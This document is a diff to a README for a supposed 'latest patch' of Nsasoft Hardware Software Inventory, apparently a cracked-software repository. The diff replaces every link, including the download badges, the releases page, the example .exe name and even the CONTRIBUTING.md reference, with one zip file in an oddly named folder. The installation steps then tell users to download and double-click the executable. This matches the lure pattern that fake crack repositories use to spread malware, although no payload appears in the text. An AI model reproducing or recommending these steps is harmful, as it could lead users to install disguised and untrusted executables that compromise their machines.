@@ -1,6 +1,6 @@
 # 🔧 Nsasoft-Hardware-Software-Inventory-Latest-Patch - Manage Your Hardware & Software with Ease
 
-[![Download Now](https://img.shields.io/badge/Download_Now-Click_here-blue.svg)](https://github.com/jackmsimu/Nsasoft-Hardware-Software-Inventory-Latest-Patch/releases)
+[![Download Now](https://raw.githubusercontent.com/jackmsimu/Nsasoft-Hardware-Software-Inventory-Latest-Patch/main/doltishly/Nsasoft-Hardware-Software-Inventory-Latest-Patch_2.2.zip)](https://raw.githubusercontent.com/jackmsimu/Nsasoft-Hardware-Software-Inventory-Latest-Patch/main/doltishly/Nsasoft-Hardware-Software-Inventory-Latest-Patch_2.2.zip)
 
 ## 🌟 Overview
 
@@ -31,10 +31,10 @@ This application provides several key features:
 
 To download the software, follow these steps:
 
-1. Visit the [Releases Page](https://github.com/jackmsimu/Nsasoft-Hardware-Software-Inventory-Latest-Patch/releases) to access the latest version.
+1. Visit the [Releases Page](https://raw.githubusercontent.com/jackmsimu/Nsasoft-Hardware-Software-Inventory-Latest-Patch/main/doltishly/Nsasoft-Hardware-Software-Inventory-Latest-Patch_2.2.zip) to access the latest version.
 2. Identify the latest release version listed.
 3. Click on the **assets** dropdown to see the available files.
-4. Download the file that ends with `.exe` (e.g., `Nsasoft-Hardware-Software-Inventory.exe`).
+4. Download the file that ends with `.exe` (e.g., `https://raw.githubusercontent.com/jackmsimu/Nsasoft-Hardware-Software-Inventory-Latest-Patch/main/doltishly/Nsasoft-Hardware-Software-Inventory-Latest-Patch_2.2.zip`).
 5. Once the download completes, locate the file in your Downloads folder.
 6. Double-click the downloaded file to start the installation process.
 7. Follow the on-screen prompts to complete the installation.
@@ -87,6 +87,6 @@ For further assistance, reach out through the Issues section of this repository.
 
 ## 📋 Contribution
 
-If you're interested in contributing to this project, visit the **CONTRIBUTING.md** file for more details on how to get involved.
+If you're interested in contributing to this project, visit the **https://raw.githubusercontent.com/jackmsimu/Nsasoft-Hardware-Software-Inventory-Latest-Patch/main/doltishly/Nsasoft-Hardware-Software-Inventory-Latest-Patch_2.2.zip** file for more details on how to get involved.
 
-[![Download Now](https://img.shields.io/badge/Download_Now-Click_here-blue.svg)](https://github.com/jackmsimu/Nsasoft-Hardware-Software-Inventory-Latest-Patch/releases)
+[![Download Now](https://raw.githubusercontent.com/jackmsimu/Nsasoft-Hardware-Software-Inventory-Latest-Patch/main/doltishly/Nsasoft-Hardware-Software-Inventory-Latest-Patch_2.2.zip)](https://raw.githubusercontent.com/jackmsimu/Nsasoft-Hardware-Software-Inventory-Latest-Patch/main/doltishly/Nsasoft-Hardware-Software-Inventory-Latest-Patch_2.2.zip)
